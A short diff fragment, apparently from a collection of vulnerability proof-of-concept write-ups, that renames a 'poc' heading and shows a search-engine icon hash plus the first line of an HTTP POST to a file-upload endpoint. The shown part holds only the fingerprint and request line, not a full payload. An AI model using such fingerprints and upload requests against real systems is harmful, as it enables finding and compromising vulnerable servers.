@@ -8,7 +8,7 @@
 icon_hash="-642591392"
 ```
 
-## poc
+## POC
 
 ```java
 POST /nssys/common/Upload.aspx?Action=DNPageAjaxPostBack HTTP/1.1
